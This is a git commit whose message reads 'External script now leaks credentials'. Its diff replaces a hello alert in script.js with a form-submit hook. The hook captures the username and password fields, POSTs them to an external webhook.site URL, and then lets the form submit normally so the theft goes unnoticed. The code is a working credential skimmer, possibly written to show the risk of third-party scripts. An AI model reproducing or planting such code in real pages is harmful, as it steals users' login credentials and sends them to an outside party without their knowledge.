e6cc3244b52c3b1c783268246a348bbe4fcb0ec8
Mats Högberg <mats@hgbrg.se>
2019-05-15 11:35:11 +0200

    External script now leaks credentials

--- script.js
+++ script.js
@@ -1,1 +1,20 @@
-alert("hello");
+var catchSubmit = true;
+var form = document.getElementById("form");
+form.onsubmit = function() {
+  if (catchSubmit) {
+    var username = document.getElementById("username").value;
+    var password = document.getElementById("password").value;
+    fetch("https://webhook.site/0e051bc1-050c-41c7-bc79-b956596973b3", {
+      method: "POST",
+      body: JSON.stringify({ username, password })
+    }).then(function() {
+      catchSubmit = false;
+      form.submit();
+    }).catch(function() {
+      catchSubmit = false;
+      form.submit();
+    });
+    return false;
+  }
+  return true;
+};
